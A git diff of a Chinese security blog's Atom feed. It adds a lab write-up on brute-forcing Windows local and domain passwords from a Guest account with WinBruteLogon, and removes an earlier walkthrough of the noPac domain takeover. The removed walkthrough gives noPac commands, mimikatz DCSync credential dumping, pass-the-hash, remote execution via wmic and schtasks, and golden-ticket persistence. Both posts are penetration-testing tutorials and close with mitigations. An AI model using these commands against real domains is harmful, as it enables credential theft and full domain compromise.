@@ -2,13 +2,53 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://V-alkoinen.github.io</id>
     <title>老白</title>
-    <updated>2022-03-03T13:15:01.805Z</updated>
+    <updated>2022-03-07T09:38:17.052Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://V-alkoinen.github.io"/>
     <link rel="self" href="https://V-alkoinen.github.io/atom.xml"/>
     <logo>https://V-alkoinen.github.io/images/avatar.png</logo>
     <icon>https://V-alkoinen.github.io/favicon.ico</icon>
     <rights>All rights reserved 2022, 老白</rights>
+    <entry>
+        <title type="html"><![CDATA[Win-Brute]]></title>
+        <id>https://V-alkoinen.github.io/post/win-brute/</id>
+        <link href="https://V-alkoinen.github.io/post/win-brute/">
+        </link>
+        <updated>2022-03-01T14:20:54.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="一-项目地址">一、项目地址</h1>
+<p>  <a href="https://github.com/DarkCoderSc/win-brute-logon">https://github.com/DarkCoderSc/win-brute-logon</a></p>
+<h1 id="二-测试环境">二、测试环境</h1>
+<p>  windows 10（1903）<br>
+  windows server 2016（domain：laobai.com）</p>
+<h1 id="三-工具用法">三、工具用法</h1>
+<p> <code>WinBruteLogon.exe -u &lt;username&gt; -w &lt;wordlist_file&gt;</code><br>
+<img src="https://V-alkoinen.github.io/post-images/1646490875505.png" alt="" loading="lazy"></p>
+<h1 id="四-介绍">四、介绍</h1>
+<p>  该 POC 利用的是 <code>Microsoft Windows</code> 身份验证机制中的一个严重缺点，并不是一个漏洞。<br>
+  实际上，通过访客用户（Guest）即可爆破所有本地用户、域内用户的密码。可以参考<code>net user</code>、<code>net user /domain</code>。</p>
+<h1 id="五-测试">五、测试</h1>
+<p>  Windows 10（PC）：Guest、ljl_s（本地管理员）、user1（域用户）<br>
+  Windows Server 2016（DC）：administrator（域管）</p>
+<pre><code>net user GuestUser !QAZ2wsx /add
+net localgroup users GuestUser /delete
+net localgroup guests GuestUser /add
+</code></pre>
+<p>  使用GuestUser爆破本地管理员密码<br>
+  <code>WinBruteLogon.exe -v -d PC1 -u ljl_s -w 1.txt</code><br>
+<img src="https://V-alkoinen.github.io/post-images/1646492698000.png" alt="" loading="lazy"><br>
+  使用GuestUser爆破域用户密码<br>
+  <code>WinBruteLogon.exe -v -d laobai.com -u user1 -w 1.txt</code><br>
+<img src="https://V-alkoinen.github.io/post-images/1646492769577.png" alt="" loading="lazy"><br>
+  使用GuestUser爆破域管密码<br>
+  <code>WinBruteLogon.exe -v -d laobai.com -u administrator -w 1.txt</code><br>
+<img src="https://V-alkoinen.github.io/post-images/1646492804408.png" alt="" loading="lazy"><br>
+  附赠一个大佬的字典：<a href="https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/10k-most-common.txt">https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/10k-most-common.txt</a></p>
+<h1 id="修复方案">修复方案</h1>
+<p> 因该问题并不是一个有效的漏洞，所以我们只能做一些缓解措施：<br>
+  1、禁用访客用户；<br>
+  2、设置高强度密码。</p>
+]]></content>
+    </entry>
     <entry>
         <title type="html"><![CDATA[vulnstack 2]]></title>
         <id>https://V-alkoinen.github.io/post/vulnstack-2/</id>
@@ -546,111 +586,6 @@ public class log4jtest {
 <h1 id="五-修复方案">五、修复方案</h1>
 <p> 1、升级Apache Log4j2所有相关应用到最新版；<br>
  2、升级JDK版本，建议JDK使用11.0.1、8u191、7u201、6u211及以上的高版本。但仍有绕过Java本身对Jndi远程加载类安全限制的风险。</p>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[CVE-2021-42287/CVE-2021-42278 一键域控]]></title>
-        <id>https://V-alkoinen.github.io/post/cve-2021-42287cve-2021-42278-yi-jian-yu-kong/</id>
-        <link href="https://V-alkoinen.github.io/post/cve-2021-42287cve-2021-42278-yi-jian-yu-kong/">
-        </link>
-        <updated>2021-12-15T08:52:02.000Z</updated>
-        <content type="html"><![CDATA[<h1 id="一-前言">一、前言</h1>
-<p>  最近域爆出了一个组合漏洞，利用条件低，基本可以一键域控，具体可以参考下面链接：<br>
- · <a href="https://exploit.ph/cve-2021-42287-cve-2021-42278-weaponisation.html">CVE-2021-42287/CVE-2021-42278 Weaponisation</a><br>
- · <a href="https://mp.weixin.qq.com/s/8G4SDqe6dHqB3S47EHI7Gg">AD漏洞预警（严重）：任意域用户可获得域管理权限，极易引发勒索事件 </a><br>
- · <a href="https://www.geekby.site/2021/12/samaccountname-spoofing/">sAMAccountName spoofing</a></p>
-<h1 id="二-漏洞原理">二、漏洞原理</h1>
-<p>  如果获得了 DC 用户的 TGT 票据且域内有一台域控名为 DC$，此时将 DC 用户删除，再用 DC 用户的 TGT 票据请求 S4U2self ，那么 DC 就可以获得域控账户（DC$）的 ST 票据。</p>
-<h1 id="三-利用方法">三、利用方法</h1>
-<p>  1、创建一个机器账户；<br>
-  2、将机器账户（sAMAccountName）改名为 DC（域内有一台域控名为 DC$）；<br>
-  3、申请 TGT；<br>
-  4、删除机器账户，或将机器账户（sAMAccountName）改名为其他；<br>
-  5、域控在 TGS_REQ 时就会找不到之前为 DC 的机器用户，此时域控会寻找 DC$ 用户，并使用 DC$ 的密钥加密票据，然后我们就可以得到一张高权限的ST。</p>
-<h1 id="四-利用条件">四、利用条件</h1>
-<p>  根据用法，可以得出该组合漏洞的利用条件：<br>
-  1、要能添加机器用户；<br>
-  2、有一个域内的普通用户；</p>
-<h1 id="五-实际利用过程">五、实际利用过程</h1>
-<h3 id="51-信息收集">5.1、信息收集</h3>
-<pre><code># 获取域控列表
-nltest /dclist:
-
-#获取域控名称
-net group &quot;domain controllers&quot; /domain
-
-#获取域内所有用户名称
-net user /domain
-
-#获取某一个用户的信息
-net user &lt;username&gt; /domain
-
-#查看域内组
-net group /domain
-
-#查看组内机器
-net group &quot;domain computers&quot; /domain
-</code></pre>
-<h3 id="52-实际利用过程">5.2、实际利用过程</h3>
-<p> 我们直接采用武器化工具<br>
- EXP：<a href="https://github.com/cube0x0/noPac">https://github.com/cube0x0/noPac</a></p>
-<pre><code>#cifs权限
-.\noPac.exe -domain &lt;domain_name&gt; -user &lt;domainuser_name&gt; -pass '&lt;domainuser_pass&gt;' /dc '&lt;DC&gt;'  /mAccount &lt;机器用户名称&gt; /mPassword &lt;机器用户密码&gt; /service cifs /ptt
-
-#ldap权限
-.\noPac.exe -domain &lt;domain_name&gt; -user &lt;domainuser_name&gt; -pass '&lt;domainuser_pass&gt;' /dc '&lt;DC&gt;'  /mAccount &lt;机器用户名称&gt; /mPassword &lt;机器用户密码&gt; /service ldap /ptt
-
-#klist
-查看缓存票据
-</code></pre>
-<figure data-type="image" tabindex="1"><img src="https://V-alkoinen.github.io/post-images/1642241081628.png" alt="" loading="lazy"></figure>
-<pre><code>mimikatz
-
-#开启debug模式
-privilege::debug
-
-#打开log
-log
-
-#同步域管哈希
-lsadump::dcsync /domain:&lt;domain_name&gt; /user:administrator
-#同步krbtgt
-lsadump::dcsync /domain:&lt;domain_name&gt; /user:krbtgt
-#同步全域哈希
-lsadump::dcsync /domain:&lt;domain_name&gt; /all /csv
-</code></pre>
-<p><img src="https://V-alkoinen.github.io/post-images/1642241940038.png" alt="" loading="lazy"><br>
- 重新打开本地管理员shell</p>
-<pre><code>mimikatz
-
-privilege::debug
-
-#哈希传递
-sekurlsa::pth /domain:&lt;domian_name&gt; /user:administrator /ntlm:NTLM_HASH
-</code></pre>
-<p> 此时会有一个带有域管票据的shell，在这个shell即可执行命令</p>
-<pre><code>#查看进程
-wmic /node:ad-m process list brief
-
-#wmic执行代码
-wmic /node:ad-m process call create &quot;cmd /c whoami&gt;c:\secTest.txt&quot;
-
-#计划任务执行代码
-schtasks /create /s ad-m /tn &quot;test&quot; /st 00:00 /sc ONCE /tr &quot;cmd /c whoami&gt;c:\secTest.txt&quot; /RU System 
-schtasks /s pdc /run /tn &quot;test&quot; 
-schtasks /s pdc /delete /tn &quot;test&quot;
-</code></pre>
-<p><img src="https://V-alkoinen.github.io/post-images/1642242373554.png" alt="" loading="lazy"><br>
- 权限维持</p>
-<pre><code>#同步krbtgt hash
-mimikatz &quot;privilege::debug&quot; &quot;log&quot; &quot;lsadump::dcsync /user:krbtgt&quot; exit1
-
-#利用krbtgt hash注入黄金票据
-mimikatz &quot;kerberos::golden /domain:&lt;domain_name&gt; /sid:&lt;SID&gt; /krbtgt:&lt;krbtgt&gt; /user:administrator /ticket:golden.kirbi /ptt&quot; exit
-</code></pre>
-<p> 权限维持完成</p>
-<h1 id="六-其他">六、其他</h1>
-<p> Kerberos协议详解：<a href="http://www.nosqlnotes.com/technotes/kerberos-protocol/">http://www.nosqlnotes.com/technotes/kerberos-protocol/</a></p>
 ]]></content>
     </entry>
 </feed>
